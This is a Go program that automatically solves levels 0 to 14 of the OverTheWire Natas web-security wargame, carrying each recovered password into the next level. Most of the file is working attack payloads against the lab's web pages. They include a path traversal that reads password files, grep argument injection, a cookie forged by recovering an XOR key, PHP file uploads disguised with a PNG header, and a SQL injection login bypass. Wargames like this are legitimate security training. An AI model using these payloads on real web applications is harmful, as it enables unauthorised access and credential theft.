package main

import (
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"

	xmlpath "gopkg.in/xmlpath.v2"

	"github.com/MJKWoolnough/errors"
	"github.com/MJKWoolnough/memio"
)

var buf memio.Buffer

type Grabber interface {
	Grab(http.Request) string
}

type Grab struct{}

var grab Grab

func (g Grab) Grab(r http.Request) string {
	buf = buf[:0]
	resp, err := http.DefaultClient.Do(&r)
	e(err)
	io.Copy(&buf, resp.Body)
	resp.Body.Close()
	return string(buf)
}

type Text struct {
	Text string
}

func (t Text) Grab(http.Request) string {
	return t.Text
}

type Prefixed struct {
	Grabber
	Prefix string
	Length int
}

func (p Prefixed) Grab(r http.Request) string {
	source := p.Grabber.Grab(r)
	index := strings.Index(source, p.Prefix)
	if index < 0 || len(source) < index+len(p.Prefix)+p.Length {
		panic(errors.Error("failed to get prefixed data"))
	}
	return source[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]
}

type XPath struct {
	Grabber
	Path string
}

func (x XPath) Grab(r http.Request) string {
	p := xmlpath.MustCompile(x.Path)
	source := x.Grabber.Grab(r)
	h, err := xmlpath.ParseHTML(strings.NewReader(source))
	e(err)
	str, ok := p.String(h)
	if !ok {
		panic(errors.Error("failed to get xpath data"))
	}
	return str
}

type Path struct {
	Grabber
	Path Grabber
}

func (p Path) Grab(r http.Request) string {
	oldPath := r.URL.Path
	r.URL.Path = p.Path.Grab(r)
	s := p.Grabber.Grab(r)
	r.URL.Path = oldPath
	return s
}

type Headers struct {
	Grabber
	Headers SetData
}

func (h Headers) Grab(r http.Request) string {
	newHeaders := make(http.Header)
	for key, value := range r.Header {
		newHeaders[key] = value
	}
	h.Headers.Set(r, newHeaders)
	r.Header = newHeaders
	return h.Grabber.Grab(r)
}

type Post struct {
	Grabber
	Data SetData
	File *File
}

type File struct {
	Field, Name Grabber
	memio.Buffer
}

type MPSetter struct {
	*multipart.Writer
}

func (m MPSetter) Set(key, value string) {
	e(m.WriteField(key, value))
}

func (p Post) Grab(r http.Request) string {
	var b memio.Buffer
	m := multipart.NewWriter(&b)
	p.Data.Set(r, MPSetter{m})
	if p.File != nil {
		rw, err := m.CreateFormFile(p.File.Field.Grab(r), p.File.Name.Grab(r))
		e(err)
		io.Copy(rw, p.File)
	}
	e(m.Close())
	r.Body = &b
	r.Method = http.MethodPost
	r.ContentLength = int64(len(b))
	return Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{m.FormDataContentType()}}}.Grab(r)
}

type Get struct {
	Grabber
	Data SetData
}

func (g Get) Grab(r http.Request) string {
	values := make(url.Values, len(g.Data))
	g.Data.Set(r, values)
	oldQuery := r.URL.RawQuery
	r.URL.RawQuery = values.Encode()
	s := g.Grabber.Grab(r)
	r.URL.RawPath = oldQuery
	return s
}

type Hex2Dec struct {
	Grabber
}

func (h Hex2Dec) Grab(r http.Request) string {
	hx := h.Grabber.Grab(r)
	dec := make([]byte, hex.DecodedLen(len(hx)))
	_, err := hex.Decode(dec, []byte(hx))
	e(err)
	return string(dec)
}

type Reverse struct {
	Grabber
}

func (rv Reverse) Grab(r http.Request) string {
	str := rv.Grabber.Grab(r)
	rts := make([]byte, len(str))
	for n, b := range []byte(str) {
		rts[len(rts)-n-1] = b
	}
	return string(rts)
}

type Base64Decode struct {
	Grabber
}

func (b Base64Decode) Grab(r http.Request) string {
	str := b.Grabber.Grab(r)
	res, err := base64.StdEncoding.DecodeString(strings.Replace(str, "%3D", "=", -1))
	e(err)
	return string(res)
}

type Base64Encode struct {
	Grabber
}

func (b Base64Encode) Grab(r http.Request) string {
	str := b.Grabber.Grab(r)
	return base64.StdEncoding.EncodeToString([]byte(str))
}

type SetData map[string]Grabber

type Setter interface {
	Set(string, string)
}

func (sd SetData) Set(r http.Request, s Setter) {
	for key, g := range sd {
		s.Set(key, g.Grab(r))
	}
}

type Cookie struct {
	Name string
}

func (c Cookie) Grab(r http.Request) string {
	r.Method = http.MethodHead
	resp, err := http.DefaultClient.Do(&r)
	e(err)
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		if cookie.Name == c.Name {
			return cookie.Value
		}
	}
	panic(errors.Error("could not find cookie"))
}

type XOR struct {
	Input, Key Grabber
}

func (x XOR) Grab(r http.Request) string {
	i := x.Input.Grab(r)
	k := x.Key.Grab(r)
	o := make([]byte, len(i))
	for n, c := range []byte(i) {
		o[n] = c ^ k[n%len(k)]
	}
	return string(o)
}

type FindRepeating struct {
	Grabber
}

func (f FindRepeating) Grab(r http.Request) string {
	str := f.Grabber.Grab(r)
	for length := 1; length < len(str); length++ {
		if r := strings.Repeat(str[:length], 1+(len(str)/length)); r[:len(str)] == str {
			return str[:length]
		}
	}
	return str
}

type Combine struct {
	Prefix, Suffix Grabber
}

func (c Combine) Grab(r http.Request) string {
	prefix := c.Prefix.Grab(r)
	suffix := c.Suffix.Grab(r)
	return prefix + suffix
}

var levels = [...]Grabber{
	//level 0
	Prefixed{grab, "The password for natas1 is ", 32},
	//level 1
	Prefixed{grab, "The password for natas2 is ", 32},
	//level 2
	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}}, // image @ /files/pixel.png, go to folder, find users.txt
	//level 3
	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
	//level 4
	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
	//level 5
	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
	//level 6
	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
	//level 7
	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
	//level 8
	Post{
		Prefixed{grab, "The password for natas9 is ", 32},
		SetData{
			"submit": Text{"Submit Query"},
			"secret": Base64Decode{
				Reverse{
					Hex2Dec{
						Path{
							Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32},
							Text{"/index-source.html"},
						},
					},
				},
			},
		},
		nil,
	},
	//level 9
	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
	//level 10
	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
	//level 11
	Headers{
		Prefixed{grab, "The password for natas12 is ", 32},
		SetData{
			"Cookie": Combine{
				Text{"data="},
				Base64Encode{
					XOR{
						Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
						FindRepeating{
							XOR{
								Base64Decode{
									Cookie{"data"},
								},
								Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
							},
						},
					},
				},
			},
		},
	},
	//level 12
	Path{
		Prefixed{grab, "", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>"),
				},
			},
		},
	},
	//level 13
	Path{
		Prefixed{grab, "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php include(\"/etc/natas_webpass/natas14\"); ?>"),
				},
			},
		},
	},
	//level 14
	Post{
		Prefixed{
			grab,
			"The password for natas15 is ",
			32,
		},
		SetData{
			"username": Text{"\" OR password != \"\" #"},
		},
		nil,
	},
}

func e(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	var (
		level     uint
		password  string
		thisLevel int
	)
	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "natas0", "password for initial level")
	flag.Parse()

	r := http.Request{
		Header: make(http.Header),
	}

	defer func() {
		if err := recover(); err != nil {
			log.Printf("natas %2d: error: %s", thisLevel, err)
		}
	}()

	for n, grabber := range levels[level:] {
		thisLevel = int(level) + n

		log.Printf("natas %2d: Solving...", thisLevel)

		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", thisLevel))
		r.SetBasicAuth(fmt.Sprintf("natas%d", thisLevel), password)

		password = grabber.Grab(r)
		log.Printf("natas %2d: Password: %s", thisLevel, password)
	}
}
